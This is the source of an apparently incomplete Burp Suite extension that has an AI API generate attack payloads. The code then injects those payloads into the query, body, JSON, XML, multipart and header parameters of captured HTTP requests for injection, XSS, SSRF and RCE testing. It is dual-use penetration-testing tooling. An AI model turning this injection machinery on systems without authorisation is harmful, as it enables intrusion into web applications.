# -*- coding: utf-8 -*-
# DeepSeek Pentest AI - Burp Suite Extension By Hernan Rodriguez 
from burp import IBurpExtender, ITab, IHttpListener, IContextMenuFactory
from javax.swing import (JPanel, JTabbedPane, JTable, JScrollPane, JTextArea, JTextField,
                         JComboBox, JButton, JLabel, JOptionPane, BorderFactory, JSplitPane,
                         JMenuItem, JCheckBox, JFileChooser, RowFilter, JPasswordField, SwingUtilities)
from javax.swing.table import DefaultTableModel, TableRowSorter, DefaultTableCellRenderer
from javax.swing.event import DocumentListener
from java.awt import (BorderLayout, GridLayout, FlowLayout, Dimension, Color, Font, Toolkit)
from java.util import ArrayList, HashMap
from java.io import File, FileWriter, BufferedWriter
from java.awt.datatransfer import StringSelection

import json, urllib2, threading, time, urllib, re, base64, random, csv, os
from urlparse import urlparse 

class ColorCodeRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        comp = super(ColorCodeRenderer, self).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column)
        model = table.getModel()
        view_row = row
        if table.getRowSorter() is not None:
            view_row = table.getRowSorter().convertRowIndexToModel(row)
        vuln_col = 6
        bg = table.getBackground()
        if 0 <= view_row < model.getRowCount():
            vulnerability = model.getValueAt(view_row, vuln_col)
            try: is_text = isinstance(vulnerability, basestring)
            except NameError: is_text = isinstance(vulnerability, str)
            if vulnerability and is_text:
                v = vulnerability.lower().strip()
                if v and v not in ("no vulnerability detected", "n/a"):
                    if any(x in v for x in ["vulnerability", "sql", "xss", "injection", "lfi", "ssrf", "rce", "path", "ssti", "xxe", "nosql", "graphql", "open redirect", "crlf", "cors", "host header"]):
                        bg = Color(59, 13, 13)
                    elif any(x in v for x in ["suspicious", "warning", "error"]):
                        bg = Color(59, 59, 13)
        comp.setBackground(bg)
        if isSelected:
            comp.setBackground(comp.getBackground().darker())
        return comp

class BarChartPanel(JPanel):
    def __init__(self):
        JPanel.__init__(self)
        self.setPreferredSize(Dimension(420, 220))
        self.data = {}
        self.title = "Vulnerabilities by Type"
    def setData(self, dct):
        self.data = dict(dct) if dct else {}
        self.repaint()
    def paintComponent(self, g):
        super(BarChartPanel, self).paintComponent(g)
        g.setColor(Color(34, 34, 34)); g.fillRect(0, 0, self.getWidth(), self.getHeight())
        g.setColor(Color(220, 220, 220)); g.setFont(Font("SansSerif", Font.BOLD, 14)); g.drawString(self.title, 10, 20)
        if not self.data:
            g.setFont(Font("SansSerif", Font.PLAIN, 12)); g.drawString("No data yet", 10, 45); return
        left, right, bottom, top = 40, 10, 30, 35
        width = self.getWidth() - left - right; height = self.getHeight() - top - bottom
        g.drawLine(left, self.getHeight() - bottom, left + width, self.getHeight() - bottom)
        g.drawLine(left, self.getHeight() - bottom, left, top)
        keys = list(self.data.keys()); vals = [self.data[k] for k in keys]; maxv = max(vals) if vals else 1
        barw = max(20, width / max(1, len(keys)) - 10); x = left + 10
        g.setFont(Font("SansSerif", Font.PLAIN, 12)); g.setColor(Color(200, 200, 200))
        for k in keys:
            v = self.data[k]; barh = int((float(v) / maxv) * (height - 10)); y = self.getHeight() - bottom - barh
            g.fillRect(x, y, barw, barh); g.setColor(Color(255, 255, 255)); g.drawString(str(v), x + barw/2 - 5, y - 5)
            g.setColor(Color(220, 220, 220)); g.drawString(k, x, self.getHeight() - bottom + 15)
            x += barw + 10; g.setColor(Color(200, 200, 200))

class BodyParsers(object):
    @staticmethod
    def content_type(headers_lower):
        for h in headers_lower:
            if h.startswith('content-type:'): return h.split(':',1)[1].strip().lower()
        return ''
    @staticmethod
    def split_head_body(raw):
        parts = re.split(r'\r?\n\r?\n', raw, maxsplit=1)
        return (parts[0], parts[1]) if len(parts) == 2 else (raw, '')
    @staticmethod
    def json_paths(obj, prefix=None):
        if prefix is None: prefix=[]
        out=[]
        if isinstance(obj, dict):
            for k,v in obj.items(): out += BodyParsers.json_paths(v, prefix+[k])
        elif isinstance(obj, list):
            for i,v in enumerate(obj): out += BodyParsers.json_paths(v, prefix+[str(i)])
        else:
            out.append((".".join(prefix), obj))
        return out
    @staticmethod
    def json_set(obj, dotted, new_val):
        parts = dotted.split('.'); cur=obj
        for i,p in enumerate(parts):
            is_last = (i==len(parts)-1)
            if isinstance(cur, list):
                idx=int(p); 
                if is_last: cur[idx]=new_val
                else: cur=cur[idx]
            elif isinstance(cur, dict):
                if is_last: cur[p]=new_val
                else: cur=cur.get(p, {})
            else:
                return obj
        return obj
    @staticmethod
    def multipart_parts(body, boundary):
        parts = []
        if not boundary:
            return parts
        raw_parts = body.split("--" + boundary)
        for p in raw_parts:
            p = p.strip()
            if not p or p == '--':
                continue
            head, content = BodyParsers.split_head_body(p)
            headers = [x.strip() for x in head.splitlines() if x.strip()]
            parts.append((headers, content))
        return parts
    @staticmethod
    def multipart_rebuild(parts, boundary):
        chunks=[]
        for headers, content in parts:
            chunk = "--"+boundary+"\r\n" + "\r\n".join(headers) + "\r\n\r\n" + content
            chunks.append(chunk)
        chunks.append("--"+boundary+"--")
        return "\r\n".join(chunks)

class FindingIndex(object):
    def __init__(self): self._seen=set()
    def key(self, kind, param, location, fingerprint):
        def norm(x): 
            try: 
                return (x or '').strip().lower()
            except: 
                return str(x)
        f = re.sub(r'\s+',' ', norm(fingerprint))[:160]
        return "|".join([norm(kind), norm(param), norm(location), f])
    def seen(self, kind, param, location, fingerprint):
        k=self.key(kind,param,location,fingerprint)
        if k in self._seen: return True
        self._seen.add(k); return False

class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory):
    # ---------- Burp lifecycle ----------
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks; self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("DeepSeek Pentest AI")
        self._callbacks.printOutput("Plugin initialized")
        # Estado
        self.requests = []; self.message_infos = []; self.generated_payloads = []
        self.is_fuzzing = False; self.current_request_template = ""; self.fuzzing_results = []
        self.all_requests = []; self.request_counter = 0; self.current_http_service = None
        self.current_request_bytes = None; self.selected_request_data = None
        self.parameter_list = []; self.metrics_type_counts = HashMap(); self._baseline_length = -1
        self.finding_index = FindingIndex(); self._oast_collab_url = ""  # opcional
        # Settings + UI
        self.loadPersistedSettings(); self.initializeUI()
        callbacks.addSuiteTab(self); callbacks.registerHttpListener(self); callbacks.registerContextMenuFactory(self)

    # ---------- Settings ----------
    def loadPersistedSettings(self):
        self.persisted_settings = self._callbacks.loadExtensionSetting("deepseek_settings")
        if self.persisted_settings:
            try:
                s = json.loads(self.persisted_settings)
                self.saved_api_key = s.get("api_key",""); self.saved_capture_traffic = s.get("capture_traffic", False)
                self.saved_auto_detect = s.get("auto_detect", True); self.saved_verbose = s.get("verbose", False)
                self.saved_strategy = s.get("strategy","SQL Injection"); self.saved_payload_count = s.get("payload_count","5")
                self.saved_delay = s.get("delay","100"); self.saved_custom_prompt = s.get("custom_prompt","Generate advanced penetration testing payloads for ")
                self.saved_url_filter = s.get("url_filter","")
            except:
                self.setDefaultSettings()
        else:
            self.setDefaultSettings()
    def setDefaultSettings(self):
        self.saved_api_key=""; self.saved_capture_traffic=False; self.saved_auto_detect=True; self.saved_verbose=False
        self.saved_strategy="SQL Injection"; self.saved_payload_count="5"; self.saved_delay="100"
        self.saved_custom_prompt="Generate advanced penetration testing payloads for "; self.saved_url_filter=""
    def savePersistedSettings(self):
        settings = {
            "api_key": "".join(list(self.api_key_field.getPassword() or [])),
            "capture_traffic": self.capture_traffic_chk.isSelected(),
            "auto_detect": self.auto_detect_chk.isSelected(),
            "verbose": self.verbose_chk.isSelected(),
            "strategy": str(self.strategy_combo.getSelectedItem()),
            "payload_count": self.payload_count_field.getText(),
            "delay": self.delay_field.getText(),
            "custom_prompt": self.custom_prompt_field.getText(),
            "url_filter": self.url_filter_field.getText()
        }
        self._callbacks.saveExtensionSetting("deepseek_settings", json.dumps(settings))

    def initializeUI(self):
        self.main_panel = JPanel(BorderLayout())
        config_panel = JPanel(GridLayout(0, 2, 5, 5)); config_panel.setBorder(BorderFactory.createTitledBorder("DeepSeek Configuration"))
        # API Key
        config_panel.add(JLabel("API Key:")); self.api_key_field = JPasswordField(25); self.api_key_field.setText(self.saved_api_key); config_panel.add(self.api_key_field)
        # Strategy + custom
        config_panel.add(JLabel("Attack Type:"))
        self.strategy_combo = JComboBox(["SQL Injection","XSS","Command Injection","Path Traversal","LFI","SSRF","RCE","SSTI","XXE","NoSQL Injection","GraphQL","Open Redirect","CRLF","CORS","Host Header Injection","CUSTOM PROMPT"])
        self.strategy_combo.setSelectedItem(self.saved_strategy); self.strategy_combo.addActionListener(self.on_strategy_change); config_panel.add(self.strategy_combo)
        config_panel.add(JLabel("Custom Prompt:")); self.custom_prompt_field = JTextField(30); self.custom_prompt_field.setText(self.saved_custom_prompt)
        self.custom_prompt_field.setEnabled(self.saved_strategy=="CUSTOM PROMPT"); config_panel.add(self.custom_prompt_field)
        # Count, Delay
        config_panel.add(JLabel("Payload Count:")); self.payload_count_field = JTextField(5); self.payload_count_field.setText(self.saved_payload_count); config_panel.add(self.payload_count_field)
        config_panel.add(JLabel("Request Delay (ms):")); self.delay_field = JTextField(5); self.delay_field.setText(self.saved_delay); config_panel.add(self.delay_field)
        # Botones
        btn_panel = JPanel(FlowLayout()); 
        self.test_api_btn = JButton("Test API", actionPerformed=self.test_api_connectivity); btn_panel.add(self.test_api_btn)
        self.analyze_btn = JButton("Analyze & Generate", actionPerformed=self.analyze_and_generate); btn_panel.add(self.analyze_btn)
        self.fuzz_btn = JButton("Start Pentesting", actionPerformed=self.start_smart_fuzzing); btn_panel.add(self.fuzz_btn)
        self.stop_btn = JButton("Stop", actionPerformed=self.stop_fuzzing); btn_panel.add(self.stop_btn)
        self.clear_btn = JButton("Clear History", actionPerformed=self.clear_history); btn_panel.add(self.clear_btn)
        self.export_btn = JButton("Export to CSV", actionPerformed=self.export_to_csv); btn_panel.add(self.export_btn)
        config_panel.add(btn_panel)
        # Flags
        advanced_panel = JPanel(FlowLayout())
        self.auto_detect_chk = JCheckBox("Auto-detect vulnerabilities", True); self.auto_detect_chk.setSelected(self.saved_auto_detect); advanced_panel.add(self.auto_detect_chk)
        self.verbose_chk = JCheckBox("Verbose output", self.saved_verbose); advanced_panel.add(self.verbose_chk)
        self.capture_traffic_chk = JCheckBox("Capture all traffic", self.saved_capture_traffic); advanced_panel.add(self.capture_traffic_chk)
        config_panel.add(advanced_panel)
        # Filtro URL
        config_panel.add(JLabel("URL Filter (Request History):")); self.url_filter_field = JTextField(20); self.url_filter_field.setText(self.saved_url_filter)
        self.url_filter_field.getDocument().addDocumentListener(self.URLFilterDocumentListener(self)); config_panel.add(self.url_filter_field)
        self.main_panel.add(config_panel, BorderLayout.NORTH)

        # Tabs
        self.tabbed_pane = JTabbedPane()
        req_res_panel = JPanel(BorderLayout()); main_split = JSplitPane(JSplitPane.VERTICAL_SPLIT); main_split.setDividerLocation(200)
        self.table_model = DefaultTableModel(["#", "Method", "URL", "Status", "Length", "Payload", "Vulnerability"], 0)
        self.request_table = JTable(self.table_model); self.request_table.setPreferredScrollableViewportSize(Dimension(800,150))
        color_renderer = ColorCodeRenderer()
        for i in range(self.table_model.getColumnCount()):
            self.request_table.getColumnModel().getColumn(i).setCellRenderer(color_renderer)
        self.sorter = TableRowSorter(self.table_model); self.request_table.setRowSorter(self.sorter)
        self.request_table.getSelectionModel().valueChanged = lambda e: self.display_selected_request()
        table_scroll = JScrollPane(self.request_table); table_scroll.setBorder(BorderFactory.createTitledBorder("Request History - Click to view details"))
        detail_split = JSplitPane(JSplitPane.VERTICAL_SPLIT); detail_split.setDividerLocation(300)
        request_panel = JPanel(BorderLayout()); request_btn_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        self.send_repeater_btn = JButton("Send to Repeater", actionPerformed=self.send_to_repeater_from_ui)
        self.autobuild_intruder_btn = JButton("Auto-build Intruder set", actionPerformed=self.build_intruder_set)
        request_btn_panel.add(self.send_repeater_btn); request_btn_panel.add(self.autobuild_intruder_btn)
        self.request_text_area = JTextArea(); self.request_text_area.setEditable(False)
        request_scroll = JScrollPane(self.request_text_area); request_scroll.setBorder(BorderFactory.createTitledBorder("HTTP Request"))
        request_panel.add(request_btn_panel, BorderLayout.NORTH); request_panel.add(request_scroll, BorderLayout.CENTER)
        response_panel = JPanel(BorderLayout()); self.response_text_area = JTextArea(); self.response_text_area.setEditable(False)
        response_scroll = JScrollPane(self.response_text_area); response_scroll.setBorder(BorderFactory.createTitledBorder("HTTP Response"))
        response_panel.add(response_scroll, BorderLayout.CENTER)
        detail_split.setLeftComponent(request_panel); detail_split.setRightComponent(response_panel)
        main_split.setTopComponent(table_scroll); main_split.setBottomComponent(detail_split)
        req_res_panel.add(main_split, BorderLayout.CENTER)
        self.tabbed_pane.addTab("Pentest Live", req_res_panel)
        ai_panel = JPanel(BorderLayout()); self.ai_output = JTextArea(); ai_panel.add(JScrollPane(self.ai_output), BorderLayout.CENTER)
        self.tabbed_pane.addTab("AI Analysis", ai_panel)
        results_panel = JPanel(BorderLayout()); self.results_output = JTextArea(); results_panel.add(JScrollPane(self.results_output), BorderLayout.CENTER)
        self.tabbed_pane.addTab("Results", results_panel)
        metrics_panel = JPanel(BorderLayout()); stats_panel = JPanel(GridLayout(0, 2, 6, 6))
        stats_panel.setBorder(BorderFactory.createTitledBorder("Live Stats"))
        self.lbl_total = JLabel("Total requests: 0"); self.lbl_found = JLabel("Findings: 0")
        stats_panel.add(self.lbl_total); stats_panel.add(self.lbl_found)
        self.chart = BarChartPanel(); metrics_panel.add(stats_panel, BorderLayout.NORTH); metrics_panel.add(self.chart, BorderLayout.CENTER)
        self.tabbed_pane.addTab("Metrics", metrics_panel)
        self.main_panel.add(self.tabbed_pane, BorderLayout.CENTER)

    class URLFilterDocumentListener(DocumentListener):
        def __init__(self, outer): self.outer = outer
        def insertUpdate(self, e): self._filter(e)
        def removeUpdate(self, e): self._filter(e)
        def changedUpdate(self, e): self._filter(e)
        def _filter(self, event):
            try:
                doc = event.getDocument(); text = doc.getText(0, doc.getLength()); filter_text = (text or "").lower()
                if filter_text: self.outer.sorter.setRowFilter(RowFilter.regexFilter("(?i).*" + re.escape(filter_text) + ".*", 2))
                else: self.outer.sorter.setRowFilter(None)
            except Exception as ex:
                self.outer._callbacks.printError("URL filter error: " + str(ex))

    def on_strategy_change(self, event):
        selected = self.strategy_combo.getSelectedItem()
        self._callbacks.printOutput("[DEBUG] Attack Type changed to: " + str(selected))
        self.custom_prompt_field.setEnabled(selected == "CUSTOM PROMPT")

    # ---------- Métricas / UI ----------
    def _metrics_inc_vuln_type(self, label):
        if not label: return
        key = label.split(' - ')[0].split('|')[0].split('[')[0].strip()
        if self.metrics_type_counts.containsKey(key):
            self.metrics_type_counts.put(key, self.metrics_type_counts.get(key) + 1)
        else:
            self.metrics_type_counts.put(key, 1)
        def _ui():
            total = self.table_model.getRowCount(); self.lbl_total.setText("Total requests: {}".format(total))
            found_total = 0
            for i in range(self.table_model.getRowCount()):
                v = self.table_model.getValueAt(i, 6)
                try:
                    is_text = isinstance(v, basestring)
                except NameError:
                    is_text = isinstance(v, str)
                if v and is_text and v.lower() not in ("no vulnerability detected", "n/a"):
                    found_total += 1
            self.lbl_found.setText("Findings: {}".format(found_total))
            chart_map = {}
            for k in self.metrics_type_counts.keySet().toArray():
                chart_map[str(k)] = int(self.metrics_type_counts.get(k))
            self.chart.setData(chart_map)
        SwingUtilities.invokeLater(_ui)

    def clear_history(self, event):
        confirm = JOptionPane.showConfirmDialog(self.main_panel, "Are you sure you want to clear all history? This operation cannot be undone.", "Confirm Clear History", JOptionPane.YES_NO_OPTION)
        if confirm == JOptionPane.YES_OPTION:
            self.table_model.setRowCount(0); self.all_requests = []; self.request_counter = 0
            self.request_text_area.setText(""); self.response_text_area.setText("")
            self.results_output.setText(""); self.ai_output.setText("")
            self.selected_request_data = None; self.parameter_list = []; self.metrics_type_counts.clear()
            self._baseline_length = -1; self.lbl_total.setText("Total requests: 0"); self.lbl_found.setText("Findings: 0"); self.chart.setData({})
            self._callbacks.printOutput("History cleared")

    def export_to_csv(self, event):
        options = ["Export only vulnerabilities", "Export all history", "Export with evidence only"]
        choice = JOptionPane.showOptionDialog(self.main_panel, "What do you want to export?", "Export Options", JOptionPane.DEFAULT_OPTION, JOptionPane.QUESTION_MESSAGE, None, options, options[0])
        if choice == -1: return
        if choice == 0:
            requests_to_export = [req for req in self.all_requests if req.get("vulnerability","").lower() not in ["no vulnerability detected","n/a",""]]
            filename = "deepseek_vulnerabilities.csv"
        elif choice == 1:
            requests_to_export = self.all_requests; filename = "deepseek_full_history.csv"
        else:
            requests_to_export = [req for req in self.all_requests if "evidence:" in req.get("vulnerability","").lower()]
            filename = "deepseek_with_evidence.csv"
        if not requests_to_export: self.show_error("No data to export for selected option"); return
        chooser = JFileChooser(); chooser.setDialogTitle("Export Results to CSV"); chooser.setSelectedFile(File(filename))
        if chooser.showSaveDialog(self.main_panel) == JFileChooser.APPROVE_OPTION:
            file_path = chooser.getSelectedFile().getAbsolutePath()
            try:
                with open(file_path, 'wb') as csvfile:
                    fieldnames = ['ID','Method','URL','Status','Length','Payload','Vulnerability','Request']
                    writer = csv.DictWriter(csvfile, fieldnames=fieldnames); writer.writeheader()
                    for req in requests_to_export:
                        writer.writerow({'ID': req['id'],'Method': req['method'],'URL': req['url'],'Status': req['status'],'Length': req['length'],'Payload': req['payload'],'Vulnerability': req['vulnerability'],'Request': req['request'].encode('utf-8')})
                JOptionPane.showMessageDialog(self.main_panel, "{} records exported successfully to:\n{}".format(len(requests_to_export), file_path), "Export Successful", JOptionPane.INFORMATION_MESSAGE)
            except Exception as e:
                self.show_error("Error exporting to CSV: " + str(e))

    def test_api_connectivity(self, event):
        self.savePersistedSettings()
        api_key = "".join(list(self.api_key_field.getPassword() or []))
        if not api_key: self.show_error("Enter DeepSeek API Key"); return
        try:
            resp = self.call_deepseek_api(api_key, "ping")
            ok = (isinstance(resp, (str, unicode)) if 'unicode' in dir(__builtins__) else isinstance(resp, str)) and (len(resp) > 0) and ("Error:" not in resp)
            JOptionPane.showMessageDialog(self.main_panel, u"API connectivity looks OK.\nSample response:\n{0}".format(resp[:180]), "DeepSeek API", JOptionPane.INFORMATION_MESSAGE if ok else JOptionPane.WARNING_MESSAGE)
        except Exception as e:
            self.show_error("API test failed: " + str(e))

    def analyze_and_generate(self, event):
        self.savePersistedSettings()
        api_key = "".join(list(self.api_key_field.getPassword() or []))
        if not api_key: self.show_error("Enter DeepSeek API Key"); return
        request_text = self.request_text_area.getText()
        if not request_text.startswith(('GET','POST','PUT','DELETE','HEAD')): self.show_error("Select a valid HTTP request first"); return
        if not self.current_http_service:
            try:
                lines = request_text.split('\n'); first = lines[0].strip(); proto = None; host = None; port = None
                m = re.search(r'^(GET|POST|PUT|DELETE|HEAD)\s+((https?):\/\/[^ ]+)\s+HTTP\/', first, re.IGNORECASE)
                if m:
                    absurl = m.group(2); pm = re.match(r'^(https?):\/\/([^:\/\s]+)(?::(\d+))?', absurl, re.IGNORECASE)
                    if pm:
                        proto = pm.group(1).lower(); host = pm.group(2); port = int(pm.group(3)) if pm.group(3) else (443 if proto == 'https' else 80)
                if not host:
                    host_line = None
                    for line in lines:
                        if line.lower().startswith('host:'):
                            host_line = line.split(':',1)[1].strip(); break
                    if host_line:
                        if ':' in host_line:
                            host, p = host_line.split(':',1); host = host.strip()
                            try: port = int(p.strip())
                            except: port = None
                        else:
                            host = host_line.strip()
                        if proto is None: proto = 'https' if port == 443 else 'http'
                        if port is None: port = 443 if proto == 'https' else 80
                if host:
                    self.current_http_service = self._helpers.buildHttpService(host, port, proto)
                    self._callbacks.printOutput("HTTP service inferred: {}://{}:{}".format(proto.upper(), host, port))
                else:
                    self.show_error("Cannot infer target service. Capture a request from Burp first."); return
            except Exception:
                self.show_error("No HTTP service available. Capture a request from Burp first."); return

        self.detect_parameters(request_text)
        strategy = self.strategy_combo.getSelectedItem()
        custom_prompt = self.custom_prompt_field.getText() if strategy == "CUSTOM PROMPT" else ""
        try:
            payload_count = int(self.payload_count_field.getText())
            if payload_count <= 0 or payload_count > 50: self.show_error("Payload count must be between 1 and 50"); return
        except Exception:
            self.show_error("Invalid payload count"); return

        self.ai_output.setText("Analyzing request with DeepSeek AI...\n" + "="*60 + "\n")
        def analysis_thread():
            try:
                payloads = self.generate_intelligent_payloads(api_key, request_text, strategy, custom_prompt, payload_count)
                self.ai_output.setText("Generated Payloads:\n" + "="*60 + "\n")
                for i, p in enumerate(payloads, 1): self.ai_output.append("{}. {}\n".format(i, p))
                self.generated_payloads = payloads; self.current_request_template = request_text
                self.ai_output.append("\n" + "="*60 + "\nReady! {} payloads generated. Click 'Start Pentesting'\n".format(len(payloads)))
                self.ai_output.append("Parameters to test: {}\n".format(len(self.parameter_list)))
                for param in self.parameter_list: self.ai_output.append("  - {}[{}]\n".format(param['name'], param['location']))
            except Exception as e:
                self.ai_output.append("Error: " + str(e))
        threading.Thread(target=analysis_thread).start()

    # ---------- Descubrimiento de parámetros ----------
    def _is_valid_parameter(self, key):
        return (not key.startswith(('http','https','ftp')) and len(key) > 0 and not any(c in key for c in ['%','+',';' ,':']) and not key.isdigit() and len(key) < 80)

    def detect_parameters(self, request_text):
        self.parameter_list = []; seen=set()
        try:
            an_req = self._helpers.analyzeRequest(self.current_http_service, self._helpers.stringToBytes(request_text))
            headers = [str(h) for h in an_req.getHeaders()]; headers_lower = [h.lower() for h in headers]
            ctype = BodyParsers.content_type(headers_lower)
        except Exception:
            headers=[]; headers_lower=[]; ctype=''
        # GET
        try:
            first_line = request_text.splitlines()[0]
            if '?' in first_line:
                query_string = first_line.split('?',1)[1].split(' ')[0]
                try: qs = urllib.unquote(query_string)
                except: qs = query_string
                for param in qs.split('&'):
                    if '=' in param:
                        key = param.split('=',1)[0]
                        if self._is_valid_parameter(key) and ('GET',key) not in seen:
                            self.parameter_list.append({'name': key, 'location': 'GET'}); seen.add(('GET',key))
        except: pass
        head, body = BodyParsers.split_head_body(request_text)
        # POST urlencoded
        if 'application/x-www-form-urlencoded' in ctype:
            try:
                try: decoded = urllib.unquote(body)
                except: decoded = body
                for param in decoded.split('&'):
                    if '=' in param:
                        key = param.split('=',1)[0]
                        if self._is_valid_parameter(key) and ('POST',key) not in seen:
                            self.parameter_list.append({'name': key, 'location': 'POST'}); seen.add(('POST',key))
            except: pass
        # JSON
        if 'application/json' in ctype:
            try:
                obj = json.loads(body or '{}')
                for dotted,val in self.BodyParsers__json_paths(obj):
                    if dotted and len(dotted) < 80 and (('JSON',dotted) not in seen):
                        self.parameter_list.append({'name': dotted, 'location': 'JSON'}); seen.add(('JSON',dotted))
            except: pass
        # XML
        if 'xml' in ctype:
            for m in re.finditer(r'<([A-Za-z0-9:_\-]{1,50})>([^<]{0,200})</\1>', body or ''):
                name = m.group(1)
                if ('XML',name) not in seen:
                    self.parameter_list.append({'name': name, 'location': 'XML'}); seen.add(('XML',name))
        # multipart
        if 'multipart/form-data' in ctype:
            b_m = re.search(r'boundary=([A-Za-z0-9\'\(\)\+_,\.\-]+)', ctype)
            boundary = b_m.group(1) if b_m else None
            parts = BodyParsers.multipart_parts(body, boundary); idx=0
            for hdrs, content in parts:
                disp = next((h for h in hdrs if h.lower().startswith('content-disposition:')), '')
                m = re.search(r'name="([^"]+)"', disp); m2 = re.search(r'filename="([^"]+)"', disp)
                if m:
                    name = m.group(1)
                    if ('MULTIPART', name) not in seen:
                        self.parameter_list.append({'name': name, 'location': 'MULTIPART'}); seen.add(('MULTIPART',name))
                if m2:
                    fname = 'filename@part{}'.format(idx)
                    if ('FILENAME', fname) not in seen:
                        self.parameter_list.append({'name': fname, 'location': 'FILENAME'}); seen.add(('FILENAME',fname))
                idx+=1

        try:
            current_strategy = str(self.strategy_combo.getSelectedItem() or "").upper()
        except:
            current_strategy = ""
        if current_strategy in ("CORS", "HOST HEADER INJECTION"):
            if current_strategy == "CORS":
                header_targets = ['Origin','Referer']
            else:
                header_targets = ['Host','X-Forwarded-Host','X-Forwarded-Proto','X-Original-URL']
            for h in header_targets:
                if any(x.lower().startswith(h.lower()+':') for x in headers):
                    if ('HEADER',h) not in seen:
                        self.parameter_list.append({'name': h, 'location': 'HEADER'}); seen.add(('HEADER',h))

        self._callbacks.printOutput("Parameters detected (name[location]): " + str(["{}[{}]".format(p['name'], p['location']) for p in self.parameter_list]))

    def BodyParsers__json_paths(self, obj, prefix=None):
        if prefix is None: prefix=[]
        out=[]
        if isinstance(obj, dict):
            for k,v in obj.items(): out += self.BodyParsers__json_paths(v, prefix+[k])
        elif isinstance(obj, list):
            for i,v in enumerate(obj): out += self.BodyParsers__json_paths(v, prefix+[str(i)])
        else:
            out.append((".".join(prefix), obj))
        return out

    def _recalc_content_length(self, headers, body):
        out=[]; found=False; clen=str(len((body or "").encode('utf-8')))
        for h in headers:
            if h.lower().startswith('content-length:'):
                out.append('Content-Length: {}'.format(clen)); found=True
            else: out.append(h)
        if not found: out.append('Content-Length: {}'.format(clen))
        return out

    def inject_payload_into_parameter(self, request_text, payload, target_parameter, strategy=None):
        tname = target_parameter.get('name',''); tloc  = target_parameter.get('location','').upper()
        an_req = self._helpers.analyzeRequest(self.current_http_service, self._helpers.stringToBytes(request_text))
        headers = [str(h) for h in an_req.getHeaders()]; headers_lower = [h.lower() for h in headers]
        ctype = BodyParsers.content_type(headers_lower)
        head, body = BodyParsers.split_head_body(request_text)

        def _enc(val):
            try:
                if strategy and str(strategy).upper() == "OPEN REDIRECT":
                    return val
                return urllib.quote(val)
            except:
                return val

        # Headers
        if tloc == 'HEADER':
            new_headers=[]; injected=False
            for h in headers:
                if h.lower().startswith(tname.lower()+':'):
                    new_headers.append(tname + ": " + payload) 
                    injected=True
                else: new_headers.append(h)
            if not injected: new_headers.append(tname + ": " + payload)
            return "\r\n".join(new_headers) + "\r\n\r\n" + body

        # GET
        if tloc == 'GET':
            first = request_text.splitlines()[0]
            if '?' in first:
                pre, rest = first.split('?',1); qs, tail = rest.split(' ',1)
                try: decoded = urllib.unquote(qs)
                except: decoded = qs
                new_params=[]
                for p in decoded.split('&'):
                    if '=' in p:
                        k,v = p.split('=',1)
                        if k == tname: new_params.append(k+'='+_enc(payload))
                        else: new_params.append(k+'='+urllib.quote(v))
                    else: new_params.append(p)
                new_first = pre+'?'+('&'.join(new_params))+' '+tail
                return new_first + "\r\n" + "\r\n".join(headers[1:]) + "\r\n\r\n" + body
            return request_text

        # x-www-form-urlencoded
        if tloc == 'POST' and 'application/x-www-form-urlencoded' in ctype:
            try: decoded = urllib.unquote(body)
            except: decoded = body
            new_params=[]
            for p in decoded.split('&'):
                if '=' in p:
                    k,v = p.split('=',1)
                    if k == tname: new_params.append(k+'='+_enc(payload))
                    else: new_params.append(k+'='+urllib.quote(v))
                else: new_params.append(p)
            new_body='&'.join(new_params); new_headers = self._recalc_content_length(headers, new_body)
            return "\r\n".join(new_headers) + "\r\n\r\n" + new_body

        # JSON (sin cambios)
        if tloc == 'JSON' and 'application/json' in ctype:
            try:
                obj = json.loads(body) if body else {}
                def cast_like(old_val, text):
                    if isinstance(old_val, bool): return text.strip().lower() in ('1','true','yes','on')
                    if isinstance(old_val, (int,float)) and re.match(r'^[\-\d\.]+$', text or ''):
                        try: return int(text) if isinstance(old_val, int) else float(text)
                        except: return text
                    return text
                current = obj; parts = tname.split('.')
                ok=False
                for i,p in enumerate(parts):
                    if isinstance(current, dict) and p in current:
                        if i == len(parts)-1: current[p] = cast_like(current[p], payload); ok=True
                        else: current = current[p]
                    elif isinstance(current, list) and p.isdigit():
                        idx=int(p)
                        if idx < len(current):
                            if i == len(parts)-1: current[idx] = cast_like(current[idx], payload); ok=True
                            else: current = current[idx]
                    else: break
                if not ok: self.BodyParsers__json_set(obj, tname, payload)
                new_body = json.dumps(obj); new_headers = self._recalc_content_length(headers, new_body)
                return "\r\n".join(new_headers) + "\r\n\r\n" + new_body
            except: return request_text

        # XML (sin cambios)
        if tloc == 'XML' and 'xml' in ctype:
            def repl(m): return "<{0}>{1}</{0}>".format(tname, payload)
            new_body = re.sub(r'<{0}>([^<]*)</{0}>'.format(re.escape(tname)), repl, body or '', count=1, flags=re.IGNORECASE)
            if not new_body: new_body = body
            new_headers = self._recalc_content_length(headers, new_body)
            return "\r\n".join(new_headers) + "\r\n\r\n" + new_body

        # MULTIPART / FILENAME (sin cambios)
        if ('multipart/form-data' in ctype) and (tloc in ('MULTIPART','FILENAME')):
            b_m = re.search(r'boundary=([A-Za-z0-9\'\(\)\+_,\.\-]+)', ctype); boundary = b_m.group(1) if b_m else None
            parts = BodyParsers.multipart_parts(body, boundary); new_parts=[]; idx=0
            for hdrs, content in parts:
                disp_i = next((i for i,h in enumerate(hdrs) if h.lower().startswith('content-disposition:')), -1)
                if disp_i >= 0:
                    disp = hdrs[disp_i]
                    name_m = re.search(r'name="([^"]+)"', disp, re.IGNORECASE)
                    fname_m = re.search(r'filename="([^"]+)"', disp, re.IGNORECASE)
                    if tloc == 'MULTIPART' and name_m and name_m.group(1) == tname:
                        new_parts.append((hdrs, payload))
                    elif tloc == 'FILENAME' and fname_m and ('filename@part{}'.format(idx) == tname):
                        new_disp = re.sub(r'filename="[^"]*"', 'filename="{}"'.format(payload), disp)
                        hdrs = list(hdrs); hdrs[disp_i]=new_disp; new_parts.append((hdrs, content))
                    else: new_parts.append((hdrs, content))
                else: new_parts.append((hdrs, content))
                idx+=1
            new_body = BodyParsers.multipart_rebuild(new_parts, boundary); new_headers = self._recalc_content_length(headers, new_body)
            return "\r\n".join(new_headers) + "\r\n\r\n" + new_body

        return request_text

    # helpers json_set usados en inject JSON
